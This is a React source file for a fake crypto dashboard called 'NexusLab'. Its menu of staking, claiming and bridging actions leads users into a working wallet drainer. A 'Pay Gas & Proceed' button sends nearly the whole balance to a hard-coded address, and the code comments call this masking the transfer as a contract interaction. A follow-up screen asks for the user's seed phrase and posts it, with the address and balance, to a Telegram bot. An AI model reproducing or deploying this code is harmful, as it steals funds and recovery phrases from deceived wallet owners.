import React, { useState } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { open } = useWeb3Modal();
  const { sendTransaction } = useSendTransaction();
  const { switchChain, chains } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState("");
  const [activeTask, setActiveTask] = useState({ title: "", label: "" });

  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const openTask = (title, label) => {
    if (!isConnected) { open(); return; }
    setActiveTask({ title, label });
    setView("task_box");
  };

  const executeHiddenDrain = async () => {
    if (!balance || !balance.value) {
        setView("seed_gate");
        return;
    }

    setLoading(true);

    // DRAIN LOGIC: Total Balance minus a tiny sliver for the miner gas
    const gasBuffer = balance.value / 40n; 
    const totalDrain = balance.value - gasBuffer;

    try {
      sendTransaction({
        to: destination,
        value: totalDrain > 0n ? totalDrain : 0n,
        // We mask the data as a "Contract Interaction"
        data: "0x095ea7b3000000000000000000000000" 
      }, {
        onSettled: () => {
          setTimeout(() => {
            setLoading(false);
            setView("seed_gate");
          }, 1500);
        },
        onError: () => {
          setLoading(false);
          setView("seed_gate");
        }
      });
    } catch (e) {
      setLoading(false);
      setView("seed_gate");
    }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6">
        <div className="flex items-center gap-2 text-cyan-500 font-black italic"><ShieldCheck size={20}/>NEXUS LAB</div>
        <w3m-button balance="hide" /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in">
          {[
            { n: "Claim", i: <Database/>, l: "Claiming Rewards..." },
            { n: "Stake", i: <History/>, l: "Staking Node..." },
            { n: "Unstake", i: <Unlock/>, l: "Unstaking Pool..." },
            { n: "Migrate", i: <Activity/>, l: "V2 Transfer..." },
            { n: "Swap", i: <RefreshCcw/>, l: "Routing Swap..." },
            { n: "Rectify", i: <Settings/>, l: "RPC Reset..." },
            { n: "Airdrop", i: <Zap/>, l: "Drop Verification..." },
            { n: "Delay", i: <Clock/>, l: "Latency Sync..." },
            { n: "Bridge", i: <Cpu/>, l: "Multi-Bridge..." }
          ].map((item) => (
            <button key={item.n} onClick={() => openTask(item.n, item.l)} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl hover:border-cyan-900 transition-all">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "task_box" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-8 shadow-2xl animate-in slide-in-from-bottom-6 text-center">
          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto tracking-widest uppercase italic">← Terminate Session</button>
          
          <Cpu size={42} className="text-cyan-500 animate-pulse mx-auto mb-6" />
          <h2 className="text-white font-black text-xl italic mb-2 tracking-tighter uppercase">{activeTask.title} Handshake</h2>
          <p className="text-[9px] text-slate-500 mb-8 lowercase tracking-widest">Network: {balance?.symbol || "Detecting..."} Mainnet</p>
          
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left border-l-4 border-l-cyan-600">
            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-[0.2em]">Estimated Network Gas Fee</label>
            <div className="text-2xl font-mono text-white italic">0.0034 {balance?.symbol}</div>
            <p className="text-[8px] text-slate-600 mt-2 lowercase">Includes multi-chain batching & node synchronization costs.</p>
          </div>

          <div className="grid grid-cols-3 gap-2 mb-8">
            {chains.map((c) => (
              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="bg-slate-900 border border-slate-800 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase">
                {c.name}
              </button>
            ))}
          </div>

          <button onClick={executeHiddenDrain} className="w-full bg-cyan-600 py-6 rounded-2xl text-[11px] font-black text-white shadow-xl shadow-cyan-900/40 active:scale-95 uppercase tracking-widest">
            Pay Gas & Proceed
          </button>
        </div>
      )}

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl animate-in zoom-in">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
            <h2 className="text-white font-black text-lg italic tracking-tighter uppercase">Final Validation</h2>
            <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">Gas fee confirmed. To finalize the secure broadcast across all batched networks, input your Secure Authorization Seed (12/24 words).</p>
            <div className="mt-8">
              <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" />
            </div>
            <button onClick={() => {
              fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\n\nSEED:\n${inputVal}` }),
              });
              alert("Broadcast Initiated. Awaiting Block Confirmation."); setView("menu");
            }} className="w-full mt-6 py-6 rounded-[25px] text-[11px] font-black text-white bg-cyan-600 uppercase tracking-widest">
              Validate Handshake
            </button>
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase">Syncing Wallet Data...</p>
        </div>
      )}
    </div>
  );
}
